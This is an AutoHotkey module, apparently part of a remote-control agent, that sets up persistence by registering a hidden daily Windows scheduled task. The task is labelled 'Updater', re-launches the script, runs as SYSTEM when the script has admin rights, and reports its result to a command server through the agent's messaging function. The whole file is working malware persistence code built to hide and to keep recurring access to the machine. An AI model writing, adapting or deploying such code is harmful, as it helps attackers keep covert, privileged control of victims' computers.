; ============================================================================
; CREATE SCHEDULED TASK MODULE
; ============================================================================
; Creates a scheduled task for persistence
; ============================================================================

CreateScheduledTask(taskName := "ScheduledTask", executable := "", delayHours := 24) {
    try {
        ; Set default executable to current script if none provided
        if (executable = "") {
            scriptPath := A_ScriptFullPath
            exePath := A_AhkPath
            executable := Format('"{}" "{}"', exePath, scriptPath)
        }

        scheduler := ComObject("Schedule.Service")
        scheduler.Connect()

        rootFolder := scheduler.GetFolder("\")

        taskDef := scheduler.NewTask(0)

        taskDef.RegistrationInfo.Description := "Updater"

        if A_IsAdmin {
            taskDef.Principal.RunLevel := 1
            userId := "SYSTEM"
            logonType := 5  ; TASK_LOGON_SERVICE_ACCOUNT
        } else {
            taskDef.Principal.RunLevel := 0
            userId := A_UserName
            logonType := 3  ; TASK_LOGON_INTERACTIVE_TOKEN
        }

        triggers := taskDef.Triggers
        trigger := triggers.Create(2)  ; TASK_TRIGGER_DAILY

        startTime := DateAdd(A_Now, delayHours, "hours")
        trigger.StartBoundary := FormatTime(startTime, "yyyy-MM-ddTHH:mm:ss")
        trigger.Enabled := true

        trigger.DaysInterval := 1  ; Repeat every 1 day

        actions := taskDef.Actions
        action := actions.Create(0)  ; TASK_ACTION_EXEC

        ; Parse executable and arguments
        if InStr(executable, '"') {
            ; Extract path and arguments from quoted string
            parts := StrSplit(executable, '"',, 3)  ; Split into max 3 parts
            action.Path := parts[2]  ; The path is the second part (between quotes)
            action.Arguments := Trim(parts[3])  ; Everything after the closing quote
        } else {
            ; No quotes - split on first space
            spacePos := InStr(executable, " ")
            if spacePos {
                action.Path := SubStr(executable, 1, spacePos - 1)
                action.Arguments := Trim(SubStr(executable, spacePos + 1))
            } else {
                action.Path := executable
                action.Arguments := ""
            }
        }

        taskDef.Settings.Enabled := true
        taskDef.Settings.Hidden := true
        taskDef.Settings.AllowDemandStart := true
        taskDef.Settings.StartWhenAvailable := true

        ; Register task
        rootFolder.RegisterTaskDefinition(
            taskName,           ; Task name
            taskDef,           ; Task definition
            6,                 ; TASK_CREATE_OR_UPDATE
            userId,            ; User account
            ,                  ; Password (empty)
            logonType          ; Logon type
        )

        message := Format("command_output|{}|Scheduled task created successfully", this.agentID)
        response := this.SendMsg(this.serverIP, this.serverPort, message)

        return true

    } catch as err {
        message := Format("command_output|{}|Error creating scheduled task: {}", this.agentID, err.Message)
        response := this.SendMsg(this.serverIP, this.serverPort, message)
        return false
    }
}
